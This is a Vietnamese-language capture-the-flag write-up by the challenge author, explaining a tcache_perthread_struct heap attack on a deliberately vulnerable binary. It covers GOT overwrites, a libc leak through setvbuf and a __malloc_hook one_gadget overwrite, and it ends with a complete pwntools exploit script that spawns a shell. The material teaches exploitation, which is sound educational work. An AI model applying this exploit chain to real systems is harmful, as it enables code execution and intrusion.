# Our Poisoned Cache

## Summary
  Ý định của mình cho vòng qual chỉ là một bài pwn heap cơ bản liên quan đến **tcache struct attack** . Ban đầu challenge không có stack leak mà chỉ có heap leak tuy nhiên điều này tạo ra một challenge rất hạn hẹp và nhàm chán, dù gì thì đây cũng chỉ là một bài introduction đến với heap exploit. Tuy nhiên solution của mình sẽ không dùng đến stack leak có sẵn.
  
## Description

>My h4ck3r friend said that my program can be exploited, something something related to poisoning. I don't understack this hacking's lingo. Can you exploit this and read my file flag.txt?

![image](https://user-images.githubusercontent.com/101010673/174489807-04014b5a-7138-4afb-b016-6c767391df3a.png)  

  - Hint ở đây là liên quan đến **tcache poisoning**. Nhưng khác với technique thông thường chúng ta sẽ không overwrite lên tcache chunk đã bị free, mà chúng ta sẽ exploit thẳng vào tcache struct nằm sẵn ở trên heap.
  - Đồng thời nhận thấy đây là **partial RELRO** và **NO PIE**. Ta sẽ exploit cả vào **GOT Table**

## Reversing
  ![image](https://user-images.githubusercontent.com/101010673/174490407-e48b3b86-b3c8-4b5a-a67b-3c9f9ff4fa56.png)  

  Đây là phần quan trọng nhất của cả chương trình. Work flow của chương trình là như sau:  
  - **Malloc** 0x40 bytes chunk  
  - **Malloc** 0x10 bytes chunk (Tránh chunk consolidation)  
  - Cho ta biết **heap base** và **stack address**
  - **Free** 0x40 bytes chunk  
  - Cho ta **arbitrary write chỉ riêng trên heap** 
  ![image](https://user-images.githubusercontent.com/101010673/174490474-4022bc33-2af5-4b30-a7a5-c6f7929785c6.png)  
      
  - Chỉ **malloc** 0x40 bytes chunk 1 lần nữa nếu ta đã không ghi đè vào **fd pointer** của freed tcache chunk, và **bk pointer** nằm trong heap range  
  ![image](https://user-images.githubusercontent.com/101010673/174490505-b9ec90f3-da1b-4b58-8705-5bf2441e4235.png)  
  - **Chỉ chunk 0x40 bytes lần 2 là ta có quyền nhập vào 0x30 bytes.**  
  - Chương trình sẽ exit ngay sau đó  
    
  => Với restriction này ta không thể thực hiện **tcache poisoning** thông thường

## Prerequisite Knowledge
  Trước tiên chúng ta cần nói qua về **tcache struct attack**:  
```c
  typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];//0x40
  tcache_entry *entries[TCACHE_MAX_BINS];//0x40
} tcache_perthread_struct;
```  
  - Khi chương trình dùng đến **TCACHE**, thì **tcache_perthread_struct** sẽ được initialized và được lưu trữ ngay trên heap  
  ![image](https://user-images.githubusercontent.com/101010673/174491121-d069fa38-a099-453c-9864-84c5a8826255.png)  
  - Nó chính là chunk đầu tiên với size `0x290 bytes`
  - Struct tcache sẽ bao gồm một array *counts* đầu tiên với 0x40 bytes. Mỗi bytes sẽ đại diện cho số lượng tcache với size đó mà ta hiện có)  
  - Một array *entries* chính là **address của chunk đứng đầu trên single linked list** của tcache với từng size một. 
  ![image](https://user-images.githubusercontent.com/101010673/174491555-9f603fa8-e8ca-411f-872c-36e5af12dc4e.png)  
  ![image](https://user-images.githubusercontent.com/101010673/174491573-022e2a56-f9db-4276-9483-9a762cb55066.png)   
  - Một tcache linked list thông thường sẽ như sau: Size 0x20: Chunk 1 -> Chunk 2 -> Chunk 3 -> ..... -> Chunk 7 ( Tcache của một size chỉ cố tối đa **7 chunk**)
  - Với **tcache poisoning** thông thường ta sẽ pollute **fd (forward) pointer** để làm thay đổi linked list dẫn đến chunk tiếp theo sẽ trả về một địa chỉ khác.
  - Size 0x20: Chunk 1 -> Chunk 2(fd pointer poisoned) -> (The address we poisoned with) -> corrupted
  - Như vậy lần **malloc** thứ nhất với size 0x20 bytes, chương trình kiểm tra tcache và thấy có chunk 1 free -> Chương trình trả về chunk này cho chúng ta
  - Lần **malloc** thứ hai tương tự, nhưng lần này sau chunk 2 lại trỏ đến một address khác (Ta đã poison tcache)
  - Lần **malloc** thứ ba, sẽ trả về address mà ta đã poison
  - Tuy nhiên như đã nói ở trên chương trình có kiểm tra xem **fd pointer** của chunk có bị corrupt không thế nên ta sẽ không tấn công vào đây mà sẽ tấn công ngay vào **entries** hay chính là chunk đầu tiên  
  ![image](https://user-images.githubusercontent.com/101010673/174491604-6f550d5b-8772-4192-b2c1-6350ce65e842.png)  
  - **0x4052a0** chính là entries tương ứng với 0x50 size tcache chunks và ta cần ghi đè địa chỉ này thành địa chỉ khác

## Arbitrary Write
  Từ kiến thức về **tcache struct attack** ở trên ta đã có khả năng để **arbitrary write ngoài vùng heap** với ý tưởng như sau:
  - Quay lại về flow của chương trình: ptr = malloc(0x40) -> free(ptr) -> malloc(0x40)
  - Như vậy sau lần malloc đầu rồi free, tcache 0x50 sẽ có một chunk đấy chính là **0x4052a0**  
  - Ta sẽ ghi đè địa chỉ này lần malloc sau đó sẽ trả về address ta mong muốn  
  
  Ví dụ: Ta ghi đè với **0x405310**  
  ![image](https://user-images.githubusercontent.com/101010673/174491852-0a10a91c-3de1-4ff9-9c91-8d284adab2a7.png)  
  ![image](https://user-images.githubusercontent.com/101010673/174491913-a489e067-d9e8-46a5-bffc-fc2559fbcf68.png)  
  ![image](https://user-images.githubusercontent.com/101010673/174491894-bbce2064-b7a9-470e-b9ec-fbe069bb8d8f.png)  
  
  Giờ thì ta có thể ghi đè **GOT Table**, ghi đè **GOT của exit** thành địa chỉ của main để ta có thể chạy chương trình vô hạn lần
  
  **Chú ý:** Sau khi ta ghi đè **entries** xong thì **fd pointer** của chunk tiếp theo sẽ tiếp tục bị corrupt, nên ta cần phải ghi đè lại **fd pointer** thành null để thỏa mãn điều kiện malloc lần 2  
  ![image](https://user-images.githubusercontent.com/101010673/174492474-8d9928dc-d621-4965-822e-049dda9d33a9.png)  
  8 bytes đầu tiên không còn là null như lần đầu nữa nên ta cần ghi đè lại  
  
## Info-leak
  Đầu tiên ta cần leak được địa chỉ libc, solution của mình sẽ leak thông qua **setvbuf**  
  ![image](https://user-images.githubusercontent.com/101010673/174492592-9786c4cb-ea04-48c1-873e-24d56761aeab.png)  
  - Nếu **GOT của setvbuf** trở thành **printf**, thì ta sẽ in ra được giá trị lưu tại địa chỉ global **stdin,stdout,stderr**  
  - Mà các địa chỉ global kia lại được lưu ở **.bss** -> ta có thể ghi đè cả địa chỉ global này  
  => Ta có thể leak giá trị ở bất kì địa chỉ nào mà ta mong muốn  

## Control RIP  
  - Để kiểm soát được luồng thực thi của chương trình (Hijacking RIP), ta sẽ dùng trick phổ biến: ghi đè **__malloc_hook** thành **one_gadget**  
  - Như vậy mỗi khi chương trình gọi **malloc** -> gọi **malloc_hook** -> gọi **one_gadget**  
  ![image](https://user-images.githubusercontent.com/101010673/175662573-0fe3c977-35f6-4338-aa4b-b892f81c10bc.png)   
  - Mình sử dụng **one_gadget** nằm ở offset **0xe3b01**  
 
## Full exploit script  
```python
from pwn import *

r = remote("127.0.0.1",2005)

r.recvuntil("is: ")
heap_base = int(r.recvline()[0:-1],16)
r.recvuntil("is: ")
stack_addr = int(r.recvline()[0:-1],16)
overwrite_tcache = heap_base + 0xa8
exit_got = 0x404068
free_got = 0x404018
stderr = 0x4040a0
main = 0x004012c7
setvbuf = 0x404050
log.info("Overwriting exit GOT to point to main")
r.sendlineafter("Where:\n",str(hex(overwrite_tcache)))
r.sendlineafter("What:\n",str(hex(exit_got)))
r.send(p64(main))

r.sendlineafter("Where:\n",str(hex(heap_base + 0x310)))
r.sendlineafter("What:\n",str(hex(0x0)))
r.send(p64(0))

log.info("Overwriting setvbuf to point to printf")
r.sendlineafter("Where:\n",str(hex(overwrite_tcache)))
r.sendlineafter("What:\n",str(hex(setvbuf)))
r.send(p64(0x401050) + p64(0x401016))

r.sendlineafter("Where:\n",str(hex(heap_base + 0x3f0)))
r.sendlineafter("What:\n",str(hex(0x0)))
r.send(p64(0))

log.info("Overwriting stderr to another address point to read GOT")
r.sendlineafter("Where:\n",str(hex(overwrite_tcache)))
r.sendlineafter("What:\n",str(hex(stderr)))
r.send(p64(0x404040))
r.recv(8)


log.info("Setvbuf will now print out libc address stored at read GOT")
leak_libc = u64(r.recv(6).ljust(8,"\x00"))
libc_base = leak_libc - 0x10dfc0
malloc_hook = libc_base + 0x1ecb70
one_gadget = libc_base + 0xe3b01
log.info("Libc Base Address: " + hex(libc_base))

r.sendlineafter("Where:\n",str(hex(heap_base + 0x4d0)))
r.sendlineafter("What:\n",str(hex(0x0)))
r.send(p64(0))

log.info("Overwriting __malloc_hook to one_gadget")
r.sendlineafter("Where:\n",str(hex(overwrite_tcache)))
r.sendlineafter("What:\n",str(hex(malloc_hook)))

r.send(p64(one_gadget))
r.clean()
r.interactive()

```  
![image](https://user-images.githubusercontent.com/101010673/174493058-839a6328-e738-441d-a9fc-c9f32cbab67c.png)


  

  
  
  
  


  
  


